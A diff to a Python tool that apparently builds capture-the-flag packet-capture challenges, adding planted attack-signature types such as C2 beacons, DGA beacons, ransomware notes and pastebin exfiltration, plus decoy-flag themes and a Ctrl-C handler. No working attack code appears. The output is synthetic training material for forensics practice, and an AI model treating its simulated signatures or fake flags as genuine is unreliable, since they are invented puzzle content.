                              "http-basic", "arp-spoof", "port-scan", "brute-force",
-                             "c2-beacon"],
+                             "c2-beacon", "rogue-dhcp", "ssdp-upnp", "doh-beacon",
+                             "dga-beacon", "malware-chain", "ransomware-note",
+                             "pastebin-exfil"],
                     help="plant an attack signature that also carries the flag")
     ap.add_argument("--encode", default="base32",
                     choices=["none", "hex", "base64", "base32"],
@@ -1772,7 +2235,13 @@ def main():
     ap.add_argument("--xor", default="",
                     help="optional XOR key applied before encoding (meatier)")
     ap.add_argument("--decoys", type=int, default=3,
-                    help="number of red-herring fake flags to plant")
+                        help="number of red-herring fake flags to plant")
+    ap.add_argument("--decoy-theme", default="spongebob",
+                        choices=["spongebob", "cyber", "mixed", "custom"],
+                        help="flavor of the fake red-herring flags")
+    ap.add_argument("--decoy-words", default="",
+                        help="comma-separated words for --decoy-theme custom "
+                            "(supplying these auto-selects the custom theme)")
     # noise volumes (sessions; each expands to several packets)
     ap.add_argument("--tcp", type=int, default=12, help="generic TCP service sessions")
     ap.add_argument("--udp", type=int, default=10, help="(maps to DNS service chatter)")
@@ -1807,6 +2276,11 @@ def main():
     ap.add_argument("-i", "--interactive", action="store_true",
                     help="force the interactive menu even if other flags are given")
     args = ap.parse_args()
+
+    # normalize decoy words; supplying words auto-selects the custom theme
+    args.decoy_words = [w.strip() for w in args.decoy_words.split(",") if w.strip()]
+    if args.decoy_words and args.decoy_theme == "spongebob":
+        args.decoy_theme = "custom"
 
     # Bare launch (no args) or explicit -i -> interactive menu.
     go_interactive = args.interactive or len(sys.argv) == 1
@@ -1914,4 +2388,10 @@ def generate_once(args):
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        # user hit Ctrl-C; exit quietly instead of dumping a stack trace
+        say("\nInterrupted - no challenge written. See you next tide. \U0001F41F",
+            "warning")
+        sys.exit(130)   # 130 = conventional exit code for Ctrl-C
